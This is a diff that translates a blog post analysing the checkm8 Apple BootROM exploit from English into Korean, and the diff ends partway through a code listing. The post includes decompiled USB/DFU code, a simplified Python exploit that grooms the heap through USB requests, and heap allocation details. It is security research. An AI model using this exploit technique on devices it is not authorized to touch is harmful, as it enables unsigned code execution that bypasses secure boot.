@@ -1,7 +1,7 @@
 ---
-title: "Technical Analysis of the checkm8 Exploit"
+title: "checkm8 익스플로잇 기술 분석"
 date: 2019-10-05
-description: "Deep dive into the checkm8 bootrom exploit for Apple A5-A11 SoCs: USB DFU stack use-after-free, heap grooming, and AArch64 shellcode execution"
+description: "Apple A5~A11 SoC의 BootROM 익스플로잇 checkm8에 대한 심층 분석: USB DFU 스택 Use-After-Free, 힙 그루밍, AArch64 셸코드 실행"
 tags: ["checkm8", "iPhone", "AArch64", "iOS", "bootrom", "UAF", "jailbreak", "hardware-security"]
 categories: ["Research"]
 authors:
@@ -10,92 +10,92 @@ authors:
     image: "https://github.com/Phantomn.png"
 ---
 
-![checkm8 banner](/images/blog/checkm8-technical-analysis/Untitled.png)
+![checkm8 배너](/images/blog/checkm8-technical-analysis/Untitled.png)
 
-The checkm8 vulnerability exploits an unpatchable flaw in the BootROM of most iDevices including the iPhone X. This post provides a technical analysis of the exploit and its root cause.
+checkm8 취약점은 iPhone X를 포함한 대부분의 iDevice의 BootROM에 존재하는 수정 불가능한 결함을 이용한다. 이 글에서는 해당 익스플로잇의 기술적 분석과 근본 원인을 살펴본다.
 
-## Introduction
+## 소개
 
-Before diving into the exploit itself, it helps to understand the iDevice boot process and the role of the BootROM (also called SecureROM).
+익스플로잇을 들어가기 전에 iDevice의 부팅 과정과 BootROM(SecureROM이라고도 함)의 역할을 간단히 이해해두자.
 
-The boot chain looks like this:
+부팅 체인은 다음과 같다:
 
-![Boot chain diagram](/images/blog/checkm8-technical-analysis/Untitled-1.png)
+![부팅 체인 다이어그램](/images/blog/checkm8-technical-analysis/Untitled-1.png)
 
-When a device powers on, BootROM runs first. Its main responsibilities are:
+장치가 켜지면 BootROM이 가장 먼저 실행된다. 주요 역할은 다음과 같다:
 
-- Platform initialization (setting up required platform registers, CPU initialization, etc.)
-- Verifying and transferring control to the next boot stage
-  - BootROM supports IMG3/IMG4 image parsing
-  - BootROM has access to the GID key for image decryption
-  - For image verification, BootROM has the embedded Apple public key and necessary cryptographic primitives
-- Restoring the device via Device Firmware Update (DFU) when further booting is not possible
+- 플랫폼 초기화 (필요한 플랫폼 레지스터 설정, CPU 초기화 등)
+- 다음 부팅 단계를 검증하고 제어권 이전
+  - BootROM은 IMG3/IMG4 이미지 파싱을 지원한다
+  - BootROM은 이미지 복호화를 위해 GID 키에 접근할 수 있다
+  - 이미지 검증을 위해 내장된 Apple 공개 키와 암호화 기능을 보유한다
+- 추가 부팅이 불가능한 경우 DFU(Device Firmware Update)를 통해 장치를 복원
 
-BootROM is a very small piece of code — essentially a lightweight version of iBoot — and shares most of its library code with iBoot. Unlike iBoot, BootROM cannot be updated. It is stored in read-only memory at device manufacturing time and serves as the hardware trust root of the Secure Boot chain.
+BootROM은 매우 소규모 코드로, iBoot의 경량 버전이라 할 수 있으며 대부분의 라이브러리 코드를 iBoot와 공유한다. iBoot와 달리 BootROM은 업데이트할 수 없다. 장치 제조 시 읽기 전용 메모리에 저장되며, Secure Boot 체인의 하드웨어 신뢰 루트(trust root)로서 동작한다.
 
-A BootROM vulnerability allows an attacker to control the boot process and execute unsigned code on the device.
+BootROM 취약점은 공격자가 부팅 프로세스를 제어하고 장치에서 서명되지 않은 코드를 실행할 수 있게 한다.
 
-![Secure Boot chain](/images/blog/checkm8-technical-analysis/Untitled-2.png)
+![Secure Boot 체인](/images/blog/checkm8-technical-analysis/Untitled-2.png)
 
-## The History of checkm8
+## checkm8의 역사
 
-The checkm8 exploit was added to ipwndfu by its author axi0mX on September 27, 2019, along with a description and additional information about the exploit.
+checkm8 익스플로잇은 2019년 9월 27일 저자 axi0mX에 의해 ipwndfu에 추가되었으며, 동시에 익스플로잇에 대한 설명과 추가 정보가 공개되었다.
 
-The UAF vulnerability in the USB code was discovered while patching the iBoot beta for iOS 12. Since BootROM and iBoot share most of their code including USB, the vulnerability exists in BootROM as well.
+USB 코드에서의 UAF 취약점은 iOS 12용 iBoot 베타를 패치하던 중 발견되었다. BootROM과 iBoot는 USB를 포함한 대부분의 코드를 공유하므로, 이 취약점은 BootROM에도 동일하게 존재한다.
 
-As shown in the exploit code, this vulnerability is triggered in DFU mode — a mode that allows transferring signed images to the device via USB for later booting. DFU is useful for restoring a device after a failed update, for example.
+익스플로잇 코드에서 볼 수 있듯이, 이 취약점은 DFU 모드에서 트리거된다. DFU는 USB를 통해 서명된 이미지를 장치로 전송해 나중에 부팅할 수 있게 하는 모드로, 업데이트 실패 후 장치를 복원하는 데 유용하다.
 
-On the same day, user littlelailo announced that they had discovered this vulnerability in March and had published a description at [apollo.txt](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4). While the description matches checkm8, not all exploit details were immediately clear. This post therefore explains all details of the exploit through payload execution in BootROM.
+같은 날, 사용자 littlelailo가 3월에 이 취약점을 발견하고 [apollo.txt](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4)에 설명을 게시했다고 밝혔다. 설명은 checkm8과 일치하지만 모든 익스플로잇 세부 사항이 명확하진 않다. 이 글에서는 BootROM에서 페이로드 실행에 이르기까지 익스플로잇의 모든 세부 사항을 설명한다.
 
-The analysis is based on the resources mentioned above, the iBoot/SecureROM source code leaked in February 2018, and data gathered through experiments on a test device (iPhone 7, CPID: 8010). SecureROM and SecureRAM dumps obtained using checkm8 itself aided the analysis.
+분석은 위에서 언급한 리소스, 2018년 2월 유출된 iBoot/SecureROM 소스 코드, 그리고 테스트 장치(iPhone 7, CPID: 8010)에서 수행한 실험 데이터를 기반으로 한다. checkm8 자체를 이용해 얻은 SecureROM 및 SecureRAM 덤프도 분석에 도움을 주었다.
 
-## Necessary Info About USB
+## USB에 대한 필수 지식
 
-Since the vulnerability lives in USB code, we need to understand how this interface works. For our purposes, USB in a nutshell is sufficient — only the most relevant points are covered here.
+취약점이 USB 코드에 있으므로, 이 인터페이스가 어떻게 동작하는지 이해해야 한다. 여기서는 익스플로잇과 가장 관련 있는 핵심 내용만 다룬다.
 
-There are various types of USB data transfers. In DFU, only **control transfer** mode is used.
+USB 데이터 전송에는 다양한 타입이 있다. DFU에서는 **제어 전송(control transfer)** 모드만 사용된다.
 
-In this mode, each transaction has three stages:
+이 모드에서 각 트랜잭션은 세 단계로 구성된다:
 
-- **Setup Stage** — A Setup packet is sent with the following fields:
-  - `bmRequestType` — defines direction, type, and recipient of the request
-  - `bRequest` — defines the request itself
-  - `wValue`, `wIndex` — interpreted depending on the request
-  - `wLength` — specifies the length of data transferred in the Data Stage
-- **Data Stage** — An optional data transfer stage. Data can be sent host-to-device (OUT) or device-to-host (IN) based on the Setup packet. Data is sent in small chunks (0x40 bytes for Apple DFU).
-  - When the host wants to send more data, it sends an OUT token followed by the data itself.
-  - When the host is ready to receive data, it sends an IN token to the device.
-- **Status Stage** — The final stage, where the overall transaction status is reported.
-  - For OUT requests, the host sends an IN token and the device must respond with a zero-length packet.
-  - For IN requests, the host sends an OUT token and a zero-length packet.
+- **Setup Stage** — Setup 패킷이 전송된다. 다음 필드를 포함한다:
+  - `bmRequestType` — 요청의 방향, 타입, 수신자(recipient)를 정의
+  - `bRequest` — 요청 자체를 정의
+  - `wValue`, `wIndex` — 요청에 따라 해석됨
+  - `wLength` — Data Stage에서 전송되는 데이터 길이 지정
+- **Data Stage** — 선택적 데이터 전송 단계. Setup 패킷에 따라 호스트→장치(OUT) 또는 장치→호스트(IN) 방향으로 데이터를 전송한다. 데이터는 작은 청크 단위로 전송된다(Apple DFU의 경우 0x40 바이트).
+  - 호스트가 더 많은 데이터를 보내려면 OUT 토큰 후 데이터를 전송
+  - 호스트가 장치로부터 데이터를 받을 준비가 되면 장치에 IN 토큰 전송
+- **Status Stage** — 최종 단계로, 전체 트랜잭션 상태가 보고된다.
+  - OUT 요청의 경우: 호스트가 IN 토큰을 보내고 장치는 길이 0 패킷으로 응답
+  - IN 요청의 경우: 호스트가 OUT 토큰과 길이 0 패킷을 전송
 
-The following schema shows OUT and IN requests (ACK, NACK and other handshake packets omitted for clarity):
+아래 스키마는 OUT 및 IN 요청을 보여준다(ACK, NACK 등 핸드셰이크 패킷은 생략):
 
-![USB transaction schema](/images/blog/checkm8-technical-analysis/Untitled-3.png)
+![USB 트랜잭션 스키마](/images/blog/checkm8-technical-analysis/Untitled-3.png)
 
-## Analysis of apollo.txt
+## apollo.txt 분석
 
-This document describes the DFU mode algorithm. Essentially, every bootrom littlelailo has examined contains the following bug:
+이 문서는 DFU 모드 알고리즘을 설명한다. 기본적으로 littlelailo가 분석한 모든 BootROM에는 다음과 같은 버그가 존재한다:
 
-1. When USB starts fetching an image through DFU, DFU registers an interface that handles all commands and allocates buffers for input and output.
-2. When data is sent to DFU, the Setup packet is handled by the main code and the interface code is called.
-3. The interface code checks that `wLength` is shorter than the I/O buffer length, and in that case updates the pointer passed as an argument with the address of the I/O buffer.
-4. It then returns the length it wants to receive as data.
-5. The USB main code updates a global variable with the length and prepares to receive data packets.
-6. When data packets arrive, they are written to the I/O buffer through the pointer passed as argument, and another global variable tracks how many bytes have already been received.
-7. When all expected data is received, DFU-specific code is called again and copies the I/O buffer contents to the memory area where the image will later be booted from.
-8. USB code then resets all variables and processes the next packet.
-9. When DFU exits, the output buffer is freed; if image parsing fails, BootROM re-enters DFU.
+1. USB가 DFU를 통해 이미지를 가져오기 시작하면, DFU는 모든 명령을 처리하는 인터페이스를 등록하고 입출력 버퍼를 할당한다.
+2. DFU로 데이터를 전송하면 Setup 패킷이 메인 코드에 의해 처리되고 인터페이스 코드가 호출된다.
+3. 인터페이스 코드는 `wLength`가 입출력 버퍼 길이보다 짧은지 확인하고, 그 경우 인자로 전달된 포인터에 입출력 버퍼의 주소를 업데이트한다.
+4. 그런 다음 수신하고자 하는 데이터 길이를 반환한다.
+5. USB 메인 코드는 전역 변수를 해당 길이로 업데이트하고 데이터 패킷 수신을 준비한다.
+6. 데이터 패킷이 수신되면 인자로 전달된 포인터를 통해 입출력 버퍼에 기록되고, 다른 전역 변수로 수신된 바이트 수를 추적한다.
+7. 모든 데이터가 수신되면 DFU 특정 코드가 다시 호출되어 입출력 버퍼 내용을 이미지가 나중에 부팅될 메모리 위치로 복사한다.
+8. USB 코드가 모든 변수를 초기화하고 다음 패킷을 처리한다.
+9. DFU가 종료되면 출력 버퍼가 해제되고, 이미지 파싱에 실패하면 BootROM이 DFU를 다시 초기화한다.
 
-Comparing these steps against the iBoot source code and the SecureROM reversed from an iPhone 7 in IDA:
+이 단계들을 iBoot 소스 코드와 IDA에서 iPhone 7의 SecureROM을 리버싱한 결과와 비교해보자.
 
-DFU initialization allocates the I/O buffer and registers a USB interface for handling DFU requests:
+DFU 초기화 시 입출력 버퍼가 할당되고 DFU 요청 처리를 위한 USB 인터페이스가 등록된다:
 
 ```c
 __int64 usb_dfu_init(){
     if(usb_dfu_inited & 1)
         return 0;
-    io_buffer = memalign(0x800, 0x40); // IO-buffer allocation
+    io_buffer = memalign(0x800, 0x40); // IO-buffer 할당
     bzero(io_buffer, 0x800);
 
     unk_180088AD4[6] = [0,50,0,0,2,0];
@@ -103,7 +103,7 @@ __int64 usb_dfu_init(){
     byte_180088AC2[0] = 2;
     unk_180088AC8 = -1;
 
-    // Register USB interface for handling DFU requests
+    // DFU 요청 처리를 위한 USB 인터페이스 등록
     sub_10000AED4((__int64)&unk_180088AF0, 1, 0);
     usb_dfu_interface_instance.field_0 = 1;
     usb_dfu_interface_instance.field_8 = (__int64)&dword_100018794;
@@ -119,19 +119,19 @@ __int64 usb_dfu_init(){
 }
 ```
 
-When a SETUP packet for a DFU request arrives, the appropriate interface handler is called. For OUT requests (e.g., when an image is being transferred), the handler must return the I/O buffer address and the expected data length:
+DFU 요청에 대한 SETUP 패킷이 들어오면 해당 인터페이스 핸들러가 호출된다. OUT 요청(예: 이미지 전송)의 경우, 핸들러는 입출력 버퍼 주소와 수신할 데이터 길이를 반환해야 한다:
 
 ```c
-// get interface control request handler
+// 인터페이스 제어 요청 핸들러 가져오기
 request_handler = ep.registered_interfaces[(unsigned __int16)setup_request.wIndex]->request_handler;
 if(!request_handler)
     goto LABEL_50;
-// call to interface control request handler
-// set global buffer pointer
+// 인터페이스 제어 요청 핸들러 호출
+// 전역 버퍼 포인터 설정
 request_handler(&g_setup_request, &ep0_data_phase_buffer);
 if( !(g_setup_request.bmRequestType & 0x80000000)){
     if(request_handler_ret >= 1){
-        ep0_data_phase_length = request_handler_ret; // set global length
+        ep0_data_phase_length = request_handler_ret; // 전역 길이 설정
         ep0_data_phase_if_num = intf_num;
         goto LABEL_101;
     }
@@ -147,7 +147,7 @@ LABEL_101:
     if(g_setup_request.bmRequestType & 0x80){
         if((g_setup_request.bmRequestType & 0x80) != 0x80)
             return
-        need_data_phase = 1; // activate data phase
+        need_data_phase = 1; // data phase 활성화
     }else{
         need_data_phase = *(unsigned __int64 *)&g_setup_request >> 48 != 0;
     }
@@ -155,7 +155,7 @@ LABEL_101:
 }
 ```
 
-The DFU interface handler below checks the request; if valid, it returns the I/O buffer address (via output parameter) and the expected data length:
+DFU 인터페이스 핸들러는 요청을 확인하고, 유효하면 입출력 버퍼 주소(출력 파라미터 경유)와 예상 데이터 길이를 반환한다:
 
 ```c
 excepted_length = (unsigned __int16)setup_request->wLength;
@@ -166,7 +166,7 @@ excepted_length = (unsigned __int16)setup_request->wLength;
             byte_180088AC2[0] = 2;
             return -1;
         }
-        *out_buffer = io_buffer; // return buffer pointer via argument
+        *out_buffer = io_buffer; // 인자를 통해 버퍼 포인터 반환
     }else{
         dword_180088AD4 = 12800; // 0x3200
         word_180088AD8 = 6;
@@ -177,7 +177,7 @@ excepted_length = (unsigned __int16)setup_request->wLength;
 }
 ```
 
-During the Data Stage, each data chunk is written to the I/O buffer, then the buffer pointer and received counter are updated. When all expected data is received, the interface data-received handler is called and the global state is cleared:
+Data Stage 동안 각 데이터 청크가 입출력 버퍼에 기록된 뒤, 버퍼 포인터와 수신 카운터가 업데이트된다. 모든 예상 데이터가 수신되면 인터페이스의 data-received 핸들러가 호출되고 전역 상태가 초기화된다:
 
 ```c
 *data_phase = 0;
@@ -189,11 +189,11 @@ During the Data Stage, each data chunk is written to the I/O buffer, then the bu
                 to_copy = data_rcvd;
             else
                 to_copy = ep0_data_phase_length - ep0_data_phase_rcvd;
-            memcpy(ep0_data_phase_buffer, ep0_rx_buffer, to_copy); // copy received data to IO-buffer
-            ep0_data_phase_buffer += (unsigned int)to_copy; // update global buffer pointer
-            ep0_data_phase_rcvd += to_copy; // update received counter
+            memcpy(ep0_data_phase_buffer, ep0_rx_buffer, to_copy); // 수신 데이터를 IO-buffer에 복사
+            ep0_data_phase_buffer += (unsigned int)to_copy; // 전역 버퍼 포인터 업데이트
+            ep0_data_phase_rcvd += to_copy; // 수신 카운터 업데이트
             *data_phase = 1;
-            // Stop transfer if expected bytes received or fewer than 0x40 bytes received
+            // 예상 바이트 수신 완료 또는 0x40 바이트 미만 수신 시 전송 중지
             if(data_rcvd == 0x40)
                 end_of_transfer = ep0_data_phase_rcvd == ep0_data_phase_length;
             else
@@ -201,7 +201,7 @@ During the Data Stage, each data chunk is written to the I/O buffer, then the bu
             if(!end_of_transfer)
                 return;
             if(!(ep0_data_phase_if_num & 0x80000000) && ep0_data_phase_if_num < registered_interfaces_count){
-                // get interface data received handler
+                // 인터페이스 data received 핸들러 가져오기
                 data_received_handler = ep.registered_interfaces[ep0_data_phase_if_num]->data_received_handler;
                 if(data_received_handler){
                     data_received_handler(ep0_data_phase_rcvd);
@@ -211,7 +211,7 @@ During the Data Stage, each data chunk is written to the I/O buffer, then the bu
         }else{
             sub_10000CF3C();
         }
-        // global state clearing
+        // 전역 상태 초기화
         ep0_data_phase_rcvd = 0;
         ep0_data_phase_length = 0;
         ep0_data_phase_buffer = 0;
@@ -222,31 +222,31 @@ During the Data Stage, each data chunk is written to the I/O buffer, then the bu
 }
 ```
 
-In the DFU data handler, received data is moved to the memory area where the image will be loaded (referred to as `INSECURE_MEMORY` in iBoot source):
+DFU data 핸들러에서 수신된 데이터는 나중에 이미지가 로드될 메모리 영역(iBoot 소스 코드에서 `INSECURE_MEMORY`라 불리는 곳)으로 이동된다:
 
 ```c
 *(QWORD *)&received = sub_10000AEE8(&unk_180088AF0);
     goto data_received;
 }
-*(QWORD *)&received = memcpy(*image_buffer[total_received], io_buffer, received); // concat IO-buffer image
+*(QWORD *)&received = memcpy(*image_buffer[total_received], io_buffer, received); // IO-buffer 이미지 연결
 dfu_excepted_length = 0;
 dword_180088AD4 = 12800; // 0x3200
 total_received += received;
 ```
 
-When the device exits DFU mode, the previously allocated I/O buffer is freed.
+장치가 DFU 모드를 종료하면 앞서 할당된 입출력 버퍼가 해제된다.
 
-If an image is successfully obtained in DFU mode, it is verified and booted. If there is an error or the image cannot be booted, DFU re-initializes and the whole process repeats from the beginning.
+DFU 모드에서 이미지가 성공적으로 획득되면 검증 후 부팅된다. 오류가 발생하거나 이미지를 부팅할 수 없으면 DFU가 다시 초기화되어 전체 프로세스가 처음부터 반복된다.
 
-**The described algorithm contains a Use-After-Free vulnerability.** If a SETUP packet is sent for an image upload and the Data Stage is skipped (completing the transaction without data), then during the next DFU cycle the global state remains initialized and it is possible to write to the address of the I/O buffer allocated in the previous DFU iteration. This is the UAF.
+**설명된 알고리즘에는 Use-After-Free 취약점이 존재한다.** 이미지 업로드를 위한 SETUP 패킷을 전송하고 Data Stage를 건너뛰어 트랜잭션을 완료하면, 다음 DFU 사이클에서 전역 상태가 초기화된 채로 유지되어 이전 DFU 이터레이션에서 할당된 입출력 버퍼 주소에 쓸 수 있게 된다. 이것이 바로 UAF다.
 
-Now that we know how the UAF works, the question is: what can we overwrite, and how? Before DFU re-initializes, all resources from the previous iteration are freed, and memory allocations in the new iteration must be exactly the same (heap feng-shui).
+UAF 동작 방식을 이해했으므로, 이제 다음 DFU 이터레이션에서 무엇을 어떻게 덮어쓸 수 있는지가 문제다. DFU 재초기화 전에 이전 이터레이션의 모든 리소스가 해제되며, 새 이터레이션에서 메모리 할당이 정확히 동일하게 이루어져야 한다(힙 feng-shui).
 
-As a result, there is another memory leak that allows us to exploit the UAF.
+결과적으로 UAF를 이용할 수 있게 해주는 또 다른 메모리 leak이 존재한다.
 
-## Analysis of checkm8
+## checkm8 분석
 
-Now let's look at checkm8 itself. For illustration purposes, a simplified version of the exploit targeting iPhone 7 is used below. All platform-specific code has been removed and USB request ordering/types have been modified without affecting functionality. Payload construction has also been removed (it can be found in the original `checkm8.py`).
+이제 checkm8 자체를 살펴보자. 설명을 위해 iPhone 7을 대상으로 한 단순화된 버전의 익스플로잇을 사용한다. 플랫폼 특정 코드를 모두 제거하고, 기능에 영향을 주지 않는 범위에서 USB 요청의 순서와 타입을 변경했다. 페이로드 구성 코드도 제거했으며, 원본 `checkm8.py`에서 찾을 수 있다.
 
 ```python
 #!/usr/bin/env python
@@ -277,7 +277,7 @@ def main():
     dfu.usb_reset(device)
     dfu.release_device(device)
 
-    # set global state and restart usb
+    # global state 설정 및 USB 재시작
     device = dfu.acquire_device()
     device.serial_number
     libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
@@ -286,7 +286,7 @@ def main():
 
     time.sleep(0.5)
 
-    # heap occupation / spray
+    # heap 점령 / 스프레이
     device = dfu.acquire_device()
     device.serial_number
     stall(device)
@@ -311,18 +311,18 @@ if __name__ == '__main__':
     main()
 ```
 
-The checkm8 operation has several stages:
+checkm8의 동작은 여러 단계로 구성된다:
 
-1. Heap feng-shui
-2. Allocate and free the I/O buffer without clearing global state
-3. Overwrite `usb_device_io_request` on the heap via UAF
-4. Place the payload
-5. Execute the callback chain
-6. Execute shellcode
+1. 힙 Feng-shui
+2. 전역 상태를 초기화하지 않고 입출력 버퍼 할당 및 해제
+3. UAF를 통해 힙의 `usb_device_io_request` 덮어쓰기
+4. 페이로드 배치
+5. Callback 체인 실행
+6. 셸코드 실행
 
-### 1. Heap Feng-shui
+### 1. 힙 Feng-shui
 
-This is the most interesting stage and deserves the most detailed explanation.
+가장 흥미로운 단계로, 가장 상세하게 설명할 부분이다.
 
 ```python
 stall(device)
@@ -333,9 +333,9 @@ dfu.usb_reset(device)
 dfu.release_device(device)
 ```
 
-This stage arranges the heap in a way that allows the heap UAF to be leveraged.
+이 단계는 힙 UAF를 활용하기 좋은 방식으로 힙을 배치하는 것이 목적이다.
 
-The helper functions are defined as:
+헬퍼 함수들은 다음과 같이 정의된다:
 
 ```python
 def stall(device):
@@ -346,51 +346,51 @@ def no_leak(device):
     libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
 ```
 
-`libusb1_no_error_ctrl_transfer` is a wrapper around `device.ctrlTransfer` that ignores any exception raised during request execution.
+`libusb1_no_error_ctrl_transfer`는 `device.ctrlTransfer`를 감싸는 래퍼로, 요청 실행 중 발생하는 모든 예외를 무시한다.
 
-`libusb1_async_ctrl_transfer` is a wrapper around libusb's `libusb_submit_transfer` for asynchronous request execution.
+`libusb1_async_ctrl_transfer`는 비동기 요청 실행을 위한 libusb의 `libusb_submit_transfer` 래퍼다.
 
-Parameters passed to these calls:
+호출에 전달되는 파라미터:
 
-- Device number
-- SETUP packet data:
+- 장치 번호
+- SETUP 패킷 데이터:
   - `bmRequestType`
   - `bRequest`
   - `wValue`
   - `wIndex`
-- Data Stage data or data length (`wLength`)
-- Request timeout
+- Data Stage 데이터 또는 데이터 길이 (`wLength`)
+- 요청 타임아웃
 
-The parameters `bmRequestType`, `bRequest`, `wValue`, and `wIndex` are shared across all three request types:
+세 가지 요청 타입 모두에서 공유되는 파라미터:
 
 - `bmRequestType = 0x80`
-  - `0b1XXXXXXX` — Data Stage direction: Device to Host
-  - `0bX00XXXXX` — Standard request type
-  - `0bXXX00000` — Device is the recipient
+  - `0b1XXXXXXX` — Data Stage 방향: 장치→호스트
+  - `0bX00XXXXX` — 표준 요청 타입
+  - `0bXXX00000` — 장치가 수신자
 - `bRequest = 6` — GET_DESCRIPTOR
 - `wValue = 0x304`
-  - `wValueHigh = 0x3` — descriptor type: String (USB_DT_STRING)
-  - `wValueLow = 0x4` — string descriptor index 4 (device serial number)
-- `wIndex = 0x40A` — string language identifier (value is not relevant to the exploit)
+  - `wValueHigh = 0x3` — 디스크립터 타입: 문자열 (USB_DT_STRING)
+  - `wValueLow = 0x4` — 문자열 디스크립터 인덱스 4 (장치 시리얼 번호)
+- `wIndex = 0x40A` — 문자열 언어 식별자 (값은 익스플로잇과 무관)
 
-The request object structure (0x30 bytes allocated):
+요청 객체 구조 (0x30 바이트 할당):
 
-![usb_device_io_request structure](/images/blog/checkm8-technical-analysis/Untitled-4.png)
+![usb_device_io_request 구조](/images/blog/checkm8-technical-analysis/Untitled-4.png)
 
-The most interesting fields are `callback` and `next`:
+가장 관심 있는 필드는 `callback`과 `next`다:
 
-- `callback` — pointer to a function called when the request completes
-- `next` — pointer to the next object of the same type; used to build the request queue
+- `callback` — 요청 완료 시 호출될 함수에 대한 포인터
+- `next` — 같은 타입의 다음 객체에 대한 포인터; 요청 큐를 구성하는 데 사용
 
-The main function of `stall` is to execute a request asynchronously with a minimal timeout. With luck, the request is cancelled at the OS level and remains in the execution queue, which is why the transaction is not completed. The device continues to receive all scheduled SETUP packets and places them in the execution queue as needed.
+`stall`의 주요 기능은 최소 타임아웃으로 요청을 비동기적으로 실행하는 것이다. 운이 좋으면 OS 수준에서 요청이 취소되고 실행 큐에 남아 트랜잭션이 완료되지 않는다. 장치는 예약된 모든 SETUP 패킷을 계속 수신하고 필요 시 실행 큐에 배치한다.
 
-Experiments with an Arduino USB controller later revealed that for a successful exploit, the host must send a SETUP packet and an IN token, then cancel the transaction via timeout.
+Arduino USB 컨트롤러를 이용한 실험에서, 성공적인 익스플로잇을 위해 호스트가 SETUP 패킷과 IN 토큰을 전송한 뒤 타임아웃으로 트랜잭션을 취소해야 한다는 것을 확인했다.
 
-This incomplete transaction looks like:
+이 미완성 트랜잭션의 모습:
 
-![Incomplete stall transaction](/images/blog/checkm8-technical-analysis/Untitled-5.png)
+![미완성 stall 트랜잭션](/images/blog/checkm8-technical-analysis/Untitled-5.png)
 
-The request lengths differ by only one unit. Standard requests have the following terminal callback:
+요청 길이는 딱 한 단위만 차이 난다. 표준 요청에는 다음과 같은 터미널 콜백이 있다:
 
 ```c
 usb_device_io_request * standard_device_request_cb(usb_device_io_request * request){
@@ -403,19 +403,19 @@ usb_device_io_request * standard_device_request_cb(usb_device_io_request * reque
 }
 ```
 
-The value of `io_length` equals the minimum of `wLength` from the request's SETUP packet and the original length of the requested descriptor. Since the descriptor is quite long, `io_length` can be controlled within that length.
+`io_length` 값은 요청의 SETUP 패킷에서 `wLength`와 요청된 디스크립터의 원본 길이 중 최솟값이다. 디스크립터가 상당히 길기 때문에 그 길이 범위 내에서 `io_length`를 제어할 수 있다.
 
-The value of `g_setup_request.wLength` equals `wLength` from the most recent SETUP packet — in this case, `0xC1`.
+`g_setup_request.wLength` 값은 가장 최근 SETUP 패킷의 `wLength`와 같으며, 이 경우 `0xC1`이다.
 
-Therefore, when a `stall`- or `leak`-type request completes, the condition in the terminal callback function is met and `usb_core_send_zlp()` is called. This call creates a zero-length packet request and places it in the execution queue.
+따라서 `stall` 또는 `leak` 형태의 요청이 완료되면 터미널 콜백 함수의 조건이 충족되고 `usb_core_send_zlp()`가 호출된다. 이 호출은 길이 0 패킷 요청을 생성해 실행 큐에 추가한다.
 
-This is necessary to properly complete the transaction in the Status Stage.
+이는 Status Stage에서 트랜잭션을 올바르게 완료하는 데 필요하다.
 
-The `usb_core_complete_endpoint_io` function completes requests: it first calls the callback, then frees the request memory. Requests are completed not only when the entire transaction finishes, but also when USB is reset.
+`usb_core_complete_endpoint_io` 함수가 요청을 완료한다: 먼저 콜백을 호출하고, 그 다음 요청 메모리를 해제한다. 요청은 전체 트랜잭션 완료 시뿐만 아니라 USB 리셋 시에도 완료된다.
 
-When a reset signal is received, all requests in the execution queue are completed.
+리셋 신호가 수신되면 실행 큐의 모든 요청이 완료된다.
 
-When iterating through the cleanup loop and freeing requests later, `usb_core_send_zlp()` can be called selectively to gain enough heap control for the UAF. The cleanup loop looks like:
+정리 루프를 통해 나중에 요청을 해제할 때, `usb_core_send_zlp()`를 선택적으로 호출하여 UAF에 필요한 충분한 힙 제어권을 얻을 수 있다. 정리 루프는 다음과 같다:
 
 ```c
 aborted_list = ep->io_head;
@@ -430,26 +430,26 @@ while(aborted_list){
 }
 ```
 
-Once the queue is drained, cancelled requests are executed and completed by `usb_core_complete_endpoint_io`. Requests allocated by `usb_core_send_zlp` are placed at `ep->io_head`.
+큐가 비워지면 취소된 요청들이 `usb_core_complete_endpoint_io`에 의해 실행 및 완료된다. `usb_core_send_zlp`로 할당된 요청은 `ep->io_head`에 배치된다.
 
-When the USB reset completes, all endpoint information — including the `io_head`/`io_tail` pointers — is cleared, and the zero-length request remains on the heap. This allows small chunks to be created on the heap.
+USB 리셋이 완료되면 `io_head`/`io_tail` 포인터를 포함한 모든 엔드포인트 정보가 초기화되며, 길이 0 요청이 힙에 남게 된다. 이를 통해 힙에 작은 청크들을 생성할 수 있다.
 
-The schema below shows how this is done:
+아래 스키마는 이 방법을 보여준다:
 
-![Heap manipulation schema](/images/blog/checkm8-technical-analysis/Untitled-6.png)
+![힙 조작 스키마](/images/blog/checkm8-technical-analysis/Untitled-6.png)
 
-New memory regions are allocated from the smallest available free chunk on the SecureROM heap. By creating small free chunks using the method described above, we can control memory allocation during USB initialization, including the `io_buffer` and request allocations.
+SecureROM 힙에서 가장 작은 적절한 빈 청크에서 새 메모리 영역이 할당된다. 위에서 설명한 방법으로 작은 빈 청크들을 생성하면, `io_buffer` 및 요청 할당을 포함한 USB 초기화 중 메모리 할당을 제어할 수 있다.
 
-To understand this better, let's examine what allocations happen on the heap when DFU initializes. By analyzing the iBoot source code and reversing the SecureROM, the following sequence was determined:
+이를 더 잘 이해하기 위해 DFU 초기화 시 힙에 어떤 할당이 이루어지는지 살펴보자. iBoot 소스 코드 분석과 SecureROM 리버싱을 통해 다음 순서를 파악했다:
 
-1. String descriptor allocations:
+1. 문자열 디스크립터 할당:
    - 1.1 Nonce (size 234)
    - 1.2 Manufacturer (22)
    - 1.3 Product (62)
    - 1.4 Serial Number (198)
    - 1.5 Configuration string (62)
 
-2. Allocations related to USB controller task creation:
+2. USB 컨트롤러 태스크 생성 관련 할당:
    - 2.1 Task structure (0x3c0)
    - 2.2 Task stack (0x1000)
 
@@ -459,13 +459,13 @@ To understand this better, let's examine what allocations happen on the heap whe
    - 4.1 High-Speed (25)
    - 4.2 Full-Speed (25)
 
-Then request structures are allocated. With small chunks already on the heap, some allocations from the first category shift, and all other allocations shift accordingly. This allows overflowing into a `usb_device_io_request` by referencing the previous buffer.
+그런 다음 request 구조체가 할당된다. 힙에 작은 청크들이 있으면 첫 번째 카테고리의 일부 할당이 이동하고, 이후 모든 할당도 함께 이동한다. 이를 통해 이전 버퍼를 참조하여 `usb_device_io_request`로 오버플로할 수 있다.
 
-The result looks like this:
+결과는 다음과 같다:
 
-![Heap layout after grooming](/images/blog/checkm8-technical-analysis/Untitled-7.png)
+![그루밍 후 힙 레이아웃](/images/blog/checkm8-technical-analysis/Untitled-7.png)
 
-To calculate the required offsets, all the allocations listed above were emulated using a slightly modified version of the iBoot heap source code:
+필요한 오프셋을 계산하기 위해 위에 나열된 모든 할당을 iBoot 힙 소스 코드를 약간 수정한 버전으로 에뮬레이션했다:
 
 ```c
 #include "heap.h"
@@ -481,7 +481,7 @@ int main() {
